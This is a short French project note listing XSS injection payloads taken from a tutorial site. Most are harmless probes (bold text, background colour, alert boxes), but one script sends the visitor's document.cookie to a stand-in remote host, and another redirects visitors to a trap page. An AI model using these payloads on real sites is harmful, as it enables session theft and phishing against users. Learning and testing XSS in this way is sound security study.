Projet sur Cross-Site-Scripting-XSS ou injection XSS

Site utilisé pour récupérer les différentes injections:
https://apcpedagogie.com/les-injections-html-xss/

// Texte en gras qui clignote
<b style="text-decoration:blink ;"> Si ce texte est en gras et clignote, c’est que le site est vulnérable </b>

// Texte en gras
<b>Si ce texte est en gras, c’est que le site est potentiellement vulnérable</b>

// Mettre le fond en {couleur}
<style type="text/css"> body { background-color : red ; background-image : none ; } </style>

// Implémenter une alerte {"Vulnérabilité détectée : faille XSS"}
<script type="text/javascript"> alert("Vulnérabilité détectée : faille XSS") ; </script>
<script>alert('hackndo');</script>

// Implémente une image  
<img src="./chat.jpg" title="Une image de mon chat" />

// Récupérer les cookies 
<script type="text/javascript">  
  var addr = “http://www.serveur-distant.net/page-piege.php?cookie=” + document.cookie ;  
  var imgTag = document.createElement("img") ;
  imgTag.setAttribute("src",addr) ;
  document.body.appendChild(imgTag) ;
</script>

// Redirige vers un autre site
<script type="text/javascript">
  document.location = "http://www.serveur-distant.net/page-piege.php" ;
</script>
